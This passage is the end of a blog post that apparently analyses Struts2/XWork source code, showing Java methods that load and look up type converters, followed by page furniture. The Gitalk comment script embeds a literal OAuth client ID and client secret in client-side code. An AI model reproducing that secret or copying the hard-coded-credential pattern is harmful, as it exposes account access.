        <span class="o">}</span>

        <span class="k">return</span> <span class="n">mapping</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="n">TypeConverter</span> <span class="nf">createTypeConverter</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="c1">// type converters are used across users
</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">objectFactory</span><span class="o">.</span><span class="na">buildBean</span><span class="o">(</span><span class="n">className</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="k">instanceof</span> <span class="n">TypeConverter</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="o">(</span><span class="n">TypeConverter</span><span class="o">)</span> <span class="n">obj</span><span class="o">;</span>

            <span class="c1">// For backwards compatibility
</span><span class="c1"></span>        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="k">instanceof</span> <span class="n">ognl</span><span class="o">.</span><span class="na">TypeConverter</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">XWorkTypeConverterWrapper</span><span class="o">((</span><span class="n">ognl</span><span class="o">.</span><span class="na">TypeConverter</span><span class="o">)</span> <span class="n">obj</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">&#34;Type converter class &#34;</span> <span class="o">+</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34; doesn&#39;t implement com.opensymphony.xwork2.conversion.TypeConverter&#34;</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">loadConversionProperties</span><span class="o">(</span><span class="n">String</span> <span class="n">propsName</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">loadConversionProperties</span><span class="o">(</span><span class="n">propsName</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">loadConversionProperties</span><span class="o">(</span><span class="n">String</span> <span class="n">propsName</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">require</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Iterator</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">&gt;</span> <span class="n">resources</span> <span class="o">=</span> <span class="n">ClassLoaderUtil</span><span class="o">.</span><span class="na">getResources</span><span class="o">(</span><span class="n">propsName</span><span class="o">,</span> <span class="n">getClass</span><span class="o">(),</span> <span class="kc">true</span><span class="o">);</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">resources</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="n">resources</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
                <span class="n">Properties</span> <span class="n">props</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Properties</span><span class="o">();</span>
                <span class="n">props</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">url</span><span class="o">.</span><span class="na">openStream</span><span class="o">());</span>

                <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;processing conversion file [&#34;</span> <span class="o">+</span> <span class="n">propsName</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                <span class="o">}</span>

                <span class="k">for</span> <span class="o">(</span><span class="n">Object</span> <span class="n">o</span> <span class="o">:</span> <span class="n">props</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
                    <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">)</span> <span class="n">o</span><span class="o">;</span>
                    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>

                    <span class="k">try</span> <span class="o">{</span>
                        <span class="n">TypeConverter</span> <span class="n">_typeConverter</span> <span class="o">=</span> <span class="n">createTypeConverter</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
                        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;\t&#34;</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34; [treated as TypeConverter &#34;</span> <span class="o">+</span> <span class="n">_typeConverter</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                        <span class="o">}</span>
                        <span class="n">defaultMappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">_typeConverter</span><span class="o">);</span>
                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">LOG</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;Conversion registration error&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">require</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="n">XWorkException</span><span class="o">(</span><span class="s">&#34;Cannot load conversion properties file: &#34;</span><span class="o">+</span><span class="n">propsName</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Cannot load conversion properties file: &#34;</span><span class="o">+</span><span class="n">propsName</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="cm">/**
</span><span class="cm">     * Recurses through a class&#39; interfaces and class hierarchy looking for a TypeConverter in the default mapping that
</span><span class="cm">     * can handle the specified class.
</span><span class="cm">     *
</span><span class="cm">     * @param clazz the class the TypeConverter must handle
</span><span class="cm">     * @return a TypeConverter to handle the specified class or null if none can be found
</span><span class="cm">     */</span>
    <span class="n">TypeConverter</span> <span class="nf">lookupSuper</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">TypeConverter</span> <span class="n">result</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">defaultMappings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">// Looks for direct interfaces (depth = 1 )
</span><span class="c1"></span>                <span class="n">Class</span><span class="o">[]</span> <span class="n">interfaces</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">();</span>

                <span class="k">for</span> <span class="o">(</span><span class="n">Class</span> <span class="n">anInterface</span> <span class="o">:</span> <span class="n">interfaces</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">defaultMappings</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">anInterface</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="o">(</span><span class="n">TypeConverter</span><span class="o">)</span> <span class="n">defaultMappings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">anInterface</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
                        <span class="k">break</span><span class="o">;</span>
                    <span class="o">}</span>
                <span class="o">}</span>

                <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="c1">// Looks for the superclass
</span><span class="c1"></span>                    <span class="c1">// If &#39;clazz&#39; is the Object class, an interface, a primitive type or void then clazz.getSuperClass() returns null
</span><span class="c1"></span>                    <span class="n">result</span> <span class="o">=</span> <span class="n">lookupSuper</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">());</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span>


<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
    </article>

      <div id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script>
var gitalk = new Gitalk({
  clientID: '2f61b9423ddfde01f318',
  clientSecret: 'ae6360004775eb79f1069c0ea047f2fcd0f8cfc7',
  repo: 'dean2021.github.io',
  owner: 'dean2021',
  admin: ['dean2021'],
  id: location.pathname,      
  distractionFreeMode: false  
})

gitalk.render('gitalk-container')
  </script>



    <ul class="pager article-pager">
      <li class="pager-newer">
          <a href="/posts/struts2-internals-readbook-note_02/" data-toggle="tooltip" data-placement="top" title="XWork框架中的容器设计">&lt; Newer</a>
      </li>
      <li class="pager-older">
        <a href="/posts/struts2-internals-readbook-note/" data-toggle="tooltip" data-placement="top" title="Struts2框架源码分析:概况">Older &gt;</a>
      </li>
    </ul>
  </div>


<div class="site-footer">
  <div class="copyright">&copy; Copyright 2018 Dean</div>
  <ul class="site-footer-items">
    <li class="site-footer-item-about"><a href="/about/" title="About">About</a></li>
  </ul>
  <div class="powerdby">
    Powered by <a href="https://gohugo.io/">Hugo</a>  and Dean
  </div>
</div>


</body>
</html>
